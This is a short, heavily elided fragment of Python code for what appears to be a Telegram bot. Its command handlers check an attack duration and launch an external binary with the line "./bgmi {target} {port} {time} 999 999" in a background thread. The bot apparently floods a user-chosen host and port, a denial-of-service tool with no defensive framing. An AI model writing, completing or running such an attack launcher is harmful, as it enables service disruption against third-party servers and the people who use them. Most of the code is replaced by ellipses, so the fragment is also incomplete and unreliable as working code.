...
def help_command(message):
    ...
    # Use bot.send_message with proper Markdown formatting
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./bgmi {target} {port} {attack_time} 999 999"  # ✅ Correct variable name
...
def replay_command(message):
    ...
    threading.Thread(target=run_attack, args=(f"./bgmi {target} {port} {duration} 999 999", duration, message)).start()
